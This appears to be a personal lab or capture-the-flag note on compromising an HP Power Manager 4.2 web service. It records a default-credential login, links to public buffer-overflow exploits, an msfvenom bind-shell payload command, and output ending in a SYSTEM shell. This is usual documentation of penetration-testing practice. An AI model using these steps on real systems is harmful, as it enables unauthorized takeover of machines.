# 3 :80 HP Power Manager 4.2

```
http://192.168.125.45
Login Page

# trying default
admin:admin
# works
> http://192.168.125.45/Contents/index.asp

# under About
HP Power Manager 4.2 (Build 7) 

Py2 | bind-shell | https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/master/hpm_exploit.py
Py3 | rev-shell | https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3

Using bind-shell approach

# updating shellcode in file
$ msfvenom -p windows/shell_bind_tcp LHOST=192.168.125.45 LPORT=9090 EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python

Payload size: 352 bytes
Final size of python file: 1727 bytes

$ python hpm_exploit.py 192.168.125.45
## Usage: python hpm_exploit.py <Remote IP Address>

[+] Payload Fired... She will be back in less than a min...
[+] Give me 30 Sec!
(UNKNOWN) [192.168.125.45] 9090 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
